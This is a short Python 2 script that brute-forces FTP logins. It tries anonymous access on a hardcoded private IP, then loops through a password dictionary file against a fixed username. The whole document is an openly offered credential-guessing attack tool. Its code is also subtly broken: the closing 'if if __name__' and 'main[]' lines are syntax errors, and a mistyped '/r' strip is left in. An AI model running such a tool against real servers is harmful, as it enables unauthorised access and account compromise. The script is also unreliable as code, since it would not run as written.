# FTP Brute Force

import ftplib

def connect(host,user,password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user,password)
        ftp.quit()
        return True
    except:
        return False

def main():
    # Variables
    targetHostAddress = '10.0.0.24'
    username = 'rand'
    passwordFilePAth = 'passwords.txt'

    #Trying to connect anonymously
    print '[+] Using Anonymous Credentials for ' + targetHostAddress
    if connect(targetHostAddress,'anonymous','test@test.com'):
        print '[+] Ftp Anonymous Log on Succeeded on host' + targetHostAddress
    else:
        print '[+] Ftp Anonymous Log on Failed on host' + targetHostAddress
        #try Bruteforcing using Dictionary Attacks
        #open Password File
        passwordFile = open(passwordFilePAth,'r')

        for line in passwordFile.readlines():
            #clean the lines in Dictionary File
            password = line.strip('/r').strip('\n')
            print "Testing: " + str(password)

            if connect(targetHostAddress,username,password):
                #password Found
                print '[+] FTP Log on succeeded on host' + targetHostAddress
                exit(0)
            else:
                #password Not Found
                print '[+] FTP Log On Failed on host' + targetHostAddress

if if __name__ == '__main__':
    main[]